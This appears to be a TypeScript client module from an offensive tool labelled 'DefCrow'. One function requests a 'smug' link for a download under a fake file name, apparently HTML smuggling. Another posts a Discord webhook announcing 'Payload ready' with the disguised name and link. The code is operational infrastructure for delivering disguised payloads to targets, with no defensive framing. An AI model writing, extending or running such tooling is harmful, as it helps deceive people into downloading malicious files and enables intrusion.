import { client } from './client'

export interface SmugResponse {
  link_id: string
  url:     string
}

export async function createSmugLink(downloadId: string, fakeName: string): Promise<SmugResponse> {
  const { data } = await client.post<SmugResponse>('/v1/smug', {
    download_id: downloadId,
    fake_name:   fakeName,
  })
  return data
}

export async function sendDiscordWebhook(webhookUrl: string, smugUrl: string, fakeName: string): Promise<void> {
  const res = await fetch(webhookUrl, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title:  'Payload ready',
        color:  0x7c3aed,
        fields: [
          { name: 'File', value: `\`${fakeName}\``, inline: true  },
          { name: 'Link', value: smugUrl,           inline: false },
        ],
        footer: { text: 'DefCrow' },
      }],
    }),
  })
  if (!res.ok) throw new Error(`Discord webhook failed: ${res.status}`)
}
